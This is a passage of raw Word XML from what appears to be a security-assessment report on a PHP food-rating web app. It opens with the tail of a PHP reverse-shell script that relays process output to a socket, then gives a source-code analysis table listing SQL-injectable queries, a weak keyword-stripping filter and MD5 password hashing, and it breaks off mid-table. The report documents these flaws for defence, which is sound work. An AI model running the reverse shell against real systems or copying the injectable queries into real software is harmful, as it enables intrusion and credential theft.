        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>$input = fread($pipes[2], $chunk_size);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0422DC91" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>if ($debug) printit("STDERR: $input");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4874549B" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>fwrite($sock, $input);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31DEA569" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="457C8496" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54F7475B" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D79583C" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>fclose($sock);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="233AB809" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>fclose($pipes[0]);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EB2FAA0" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>fclose($pipes[1]);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53459F4B" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>fclose($pipes[2]);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30FCF1EA" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>proc_close($process);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72D96689" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="193F8F61" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// Like print, but does nothing if we've daemonised ourself</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="366C4E96" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// (I can't figure out how to redirect STDOUT like a proper daemon)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="740F9BDE" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>function printit ($string) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15DB8983" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>if (!$daemon) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="223735CB" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>print "$string\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B175FFF" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ACA9CC5" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19ECF0F5" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31E4B41B" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">?&gt; </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DDE4621" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRPr="004041F8" w:rsidRDefault="004D38B2" w:rsidP="004041F8">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43351D0E" w14:textId="77777777" w:rsidR="005552AE" w:rsidRDefault="005552AE" w:rsidP="0018377B">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:right="1119"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67A87D59" w14:textId="77777777" w:rsidR="001677F2" w:rsidRPr="00BA7AE1" w:rsidRDefault="001677F2" w:rsidP="0018377B">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:right="1119"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7E8A867A" wp14:editId="2355EC2F">
            <wp:extent cx="5943600" cy="86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69950"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="45DDA250" w14:textId="0CB5050E" w:rsidR="00481CA9" w:rsidRDefault="00481CA9" w:rsidP="00481CA9">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="578" w:hanging="578"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="93" w:name="_Toc58836638"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Appendix </w:t>
      </w:r>
      <w:r w:rsidR="00790807">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidR="00B05A54">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:bookmarkEnd w:id="93"/>
    </w:p>
    <w:p w14:paraId="62A8AEE0" w14:textId="77777777" w:rsidR="006E261B" w:rsidRPr="006E261B" w:rsidRDefault="006E261B" w:rsidP="006E261B">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C49C314" w14:textId="51F29FDE" w:rsidR="00E338BC" w:rsidRDefault="00790807" w:rsidP="00790807">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>2.1 Source code analysis</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="11010" w:type="dxa"/>
        <w:tblInd w:w="-714" w:type="dxa"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2788"/>
        <w:gridCol w:w="709"/>
        <w:gridCol w:w="3685"/>
        <w:gridCol w:w="3828"/>
      </w:tblGrid>
      <w:tr w:rsidR="00790807" w14:paraId="240DF47D" w14:textId="77777777" w:rsidTr="00790807">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2788" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5C1CFB9E" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>File</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="709" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5EEDCE83" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Line</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3685" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="641869EE" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3828" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="17A4B059" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89"/>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00790807" w14:paraId="25F2527F" w14:textId="77777777" w:rsidTr="00790807">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2788" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4669350E" w14:textId="77777777" w:rsidR="00790807" w:rsidRPr="00981AE8" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t xml:space="preserve">Login-exec.php </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="709" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4D25252A" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>49</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3685" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="250F9640" w14:textId="77777777" w:rsidR="00790807" w:rsidRPr="00981AE8" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3828" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6203CE7E" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r w:rsidRPr="00981AE8">
              <w:t>$sql = "SELECT * FROM members WHERE login='$username'";</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4715AF49" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89"/>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00790807" w14:paraId="49E80DBE" w14:textId="77777777" w:rsidTr="00790807">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2788" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5C5396D8" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Login-exec.php </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="709" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0DCECBF7" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>47</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3685" w:type="dxa"/>
            <w:vMerge w:val="restart"/>
          </w:tcPr>
          <w:p w14:paraId="517380FF" w14:textId="77777777" w:rsidR="00790807" w:rsidRPr="00981AE8" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:t>Weak sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3828" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="57288E4D" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r w:rsidRPr="00981AE8">
              <w:t>include 'sqlcm_filter.php';</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00790807" w14:paraId="7A347FAD" w14:textId="77777777" w:rsidTr="00790807">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2788" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="66640FD5" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t xml:space="preserve">Sqlcm_filter.php </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="709" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="27C0481B" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3685" w:type="dxa"/>
            <w:vMerge/>
          </w:tcPr>
          <w:p w14:paraId="169AF29A" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3828" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5159B9AA" w14:textId="77777777" w:rsidR="00790807" w:rsidRPr="00981AE8" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r w:rsidRPr="00981AE8">
              <w:t>&lt;?php $username= str_replace(array("1=1", "2=2", "union","Select","2 =2","2=2","'a'='a'"), "", $username); ?&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00790807" w14:paraId="210FFD10" w14:textId="77777777" w:rsidTr="00790807">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2788" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4B1316A5" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t xml:space="preserve">Login-exec.php </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="709" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="36588917" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>64</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3685" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7D900654" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Md5 hash</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3828" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="194FAF97" w14:textId="77777777" w:rsidR="00790807" w:rsidRPr="00981AE8" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r w:rsidRPr="0006062C">
              <w:t>$qry="SELECT * FROM members WHERE login='$username' AND passwd='".md5($password)."'";</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00790807" w14:paraId="2E4CAC8B" w14:textId="77777777" w:rsidTr="00790807">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2788" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7D6C140B" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t xml:space="preserve">register -exec.php </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3649E3E8" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="709" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4BB90323" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3685" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="13BA36FA" w14:textId="77777777" w:rsidR="00790807" w:rsidRPr="00981AE8" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3828" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="69DBBF74" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r w:rsidRPr="00981AE8">
              <w:t>$qry_select="SELECT * FROM members WHERE login='$login'";</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00790807" w14:paraId="148D5AB8" w14:textId="77777777" w:rsidTr="00790807">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2788" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4E841D72" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t xml:space="preserve">register-exec.php </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D6A8D29" w14:textId="77777777" w:rsidR="00790807" w:rsidRPr="00981AE8" w:rsidRDefault="00790807" w:rsidP="00225A89"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="709" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3BB62334" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>37</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3685" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="55715C67" w14:textId="77777777" w:rsidR="00790807" w:rsidRPr="00981AE8" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3828" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="78F2C570" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89"/>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00790807" w14:paraId="4E1BD792" w14:textId="77777777" w:rsidTr="00790807">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2788" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0DDDF03B" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t xml:space="preserve">register -exec.php </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1655C16E" w14:textId="77777777" w:rsidR="00790807" w:rsidRPr="00981AE8" w:rsidRDefault="00790807" w:rsidP="00225A89"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="709" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="72EA6310" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>46</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3685" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="24E74F4E" w14:textId="77777777" w:rsidR="00790807" w:rsidRPr="00981AE8" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3828" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="58DA2BCA" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r w:rsidRPr="00981AE8">
              <w:t>$qry = "INSERT INTO members(firstname, lastname, login, passwd, question_id, answer) VALUES('$fname','$lname','$login','".md5($_POST['password'])."','$question_id','".md5($_POST['answer'])."')";</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="44CED706" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89"/>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00790807" w14:paraId="42091EAE" w14:textId="77777777" w:rsidTr="00790807">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2788" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1D29E671" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Ratings-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="709" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6B7A2DD4" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>36</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3685" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="493D015F" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3828" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="446A6DF5" w14:textId="77777777" w:rsidR="00790807" w:rsidRPr="00981AE8" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r w:rsidRPr="0006062C">
              <w:t>$check = mysql_query("SELECT * FROM polls_details WHERE member_id='$member_id' AND food_id='$food_id'") or die("Something is wrong.\n Our team is working on it at the moment.\n Please try again after some few minutes.");</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00790807" w14:paraId="5FDD6110" w14:textId="77777777" w:rsidTr="00790807">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2788" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="72EAC868" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Ratings-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="709" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="34173DC3" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>44</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3685" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7AA91E9A" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3828" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="45080610" w14:textId="77777777" w:rsidR="00790807" w:rsidRPr="00981AE8" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r w:rsidRPr="0006062C">
              <w:t xml:space="preserve">$qry = "INSERT INTO polls_details(member_id,food_id,rate_id) </w:t>
            </w:r>
            <w:r w:rsidRPr="0006062C">
              <w:lastRenderedPageBreak/>
